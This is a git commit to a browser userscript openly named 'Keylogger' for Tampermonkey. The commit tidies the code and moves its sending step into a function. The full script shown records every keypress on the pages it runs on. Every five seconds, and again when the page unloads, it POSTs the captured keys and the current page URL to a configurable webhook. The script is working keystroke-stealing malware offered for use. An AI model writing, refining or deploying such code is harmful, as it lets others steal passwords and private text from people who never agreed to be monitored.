889c4738bab329d31c3ef30a6061104f6a4c7e7d
Lyzev <lyzev.info@gmail.com>
2022-03-22 19:45:58 +0100

    Little Improvement (Not very Important)

--- keylogger.js
+++ keylogger.js
@@ -1,6 +1,6 @@
 // ==UserScript==
 // @name Keylogger
-// @namespace http://tampermonkey.net/
+// @namespace https://github.com/Lyzev
 // @version 1.0
 // @description A simple keylogger for Tampermonkey. (Browser Extionsion)
 // @author Lyzev
@@ -9,27 +9,33 @@
 // @run-at document-start
 // @grant none
 // ==/UserScript==
+
 (function() {
-    let webhook = "WEBHOOK-URL"
-    let delay = 5000 // in Milliseconds
-    let data = []
+    let webhook = "WEBHOOK-URL";
+    let delay = 5000; // in Milliseconds
+    let data = [];
     document.onkeypress = function(e) {
-        data.push(e.key)
+        data.push(e.key);
     }
-    let intervall = setInterval(function() {
-        if (data.length == 0)
-            return
-        const request = new XMLHttpRequest()
-        request.open("POST", webhook)
-        request.setRequestHeader('Content-type', 'application/json')
+    let interval = setInterval(function() {
+        send();
+    }, delay);
+    window.unload = function() {
+        clearInterval(interval);
+        send();
+    }
+    function send() {
+        if (data.length === 0) {
+            return;
+        }
+        const request = new XMLHttpRequest();
+        request.open("POST", webhook);
+        request.setRequestHeader('Content-type', 'application/json');
         const params = {
             username: "Keylogger",
             content: "**URL**: `" + document.URL + "`\n" + JSON.stringify(data)
-        }
-        request.send(JSON.stringify(params))
-        data = []
-    }, delay)
-    window.unload = function() {
-        clearInterval(intervall)
+        };
+        request.send(JSON.stringify(params));
+        data = [];
     }
 })();
